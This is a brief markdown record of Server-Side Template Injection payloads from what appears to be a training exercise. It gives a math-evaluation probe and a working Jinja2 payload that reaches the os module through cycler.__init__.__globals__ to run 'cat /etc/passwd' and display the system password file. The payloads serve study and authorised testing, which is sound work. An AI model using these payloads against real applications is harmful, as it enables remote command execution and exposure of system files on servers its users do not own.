# Payloads - Template Injection

This document records the payloads used to test and exploit the Server-Side Template Injection vulnerability during the exercise.

## 1. Sanity Check / Mathematical Evaluation
* **Payload:** `{{ 3 * 3 }}`
* **Purpose:** Verifies whether the template engine is actively evaluating expressions, returning `9` if vulnerable.

## 2. System Command Execution / File Reading (Jinja2)
* **Payload:** `{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}'
* **Purpose:** Traverses the application scope to access Python's built-in modules, imports the `os` library, executes the `cat /etc/passwd` shell command, and displays the contents of the system password file.
